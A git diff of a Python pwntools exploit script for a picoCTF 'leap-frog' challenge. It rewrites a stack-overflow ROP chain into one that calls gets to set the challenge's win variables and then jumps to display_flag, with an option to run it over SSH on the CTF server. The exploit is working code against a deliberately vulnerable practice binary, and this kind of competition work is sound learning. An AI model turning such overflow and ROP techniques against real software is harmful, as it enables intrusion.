@@ -1,48 +1,28 @@
 #!/usr/bin/env python
 
 from pwn import *
+import os
 
-context.log_level = 'error'
+argv = sys.argv
 
-#set process and ELF
-p = process('./rop')
+#lead elf and get addresses
 e = ELF('./rop')
-#offset for overflow and EIP control
-offset = 28
+gets_plt = e.plt['gets']
+display_flag = e.symbols['display_flag']
+win1 = e.symbols['win1']
 
-gdb.attach(p)
-#addresses
-vuln = e.symbols['vuln']
-leapA = e.symbols['leapA']
-leap2 = e.symbols['leap2']
-leap3 = e.symbols['leap3']
-flag = e.symbols['display_flag']
-main = e.symbols['main']
-puts_got = e.got['puts']
-puts_plt = e.symbols['puts']
+if len(argv) > 1:
+	from getpass import getpass
+	ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
+	p = ssh.process('rop', cwd='/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897')
+else:
+	p = process('./rop')
 
-#leapA
 payload = ''
-payload+= 'A'*offset
-payload+= p32(leapA)
-payload+= p32(leap3)
-
+payload+= 'A'*28
+payload+= p32(gets_plt)			#calls gets function so we can write the win variables
+payload+= p32(display_flag)		#returns to display flag
+payload+= p32(win1)				#allows us to write to win1 address
 p.sendlineafter('>', payload)
-
-#leapA (again)
-payload = ''
-payload+= 'A'*offset
-payload+= p32(leapA)
-payload+= p32(main)
-
-p.sendlineafter('>', payload)
-
-#leap3
-payload = ''
-payload+= 'A'*offset
-payload+= p32(leap3)
-payload+= p32(main)
-
-p.sendlineafter('>', payload)
-
+p.sendline('\x01'*3) 			#writes the value 1 to win1, win2, and win3
 p.interactive()
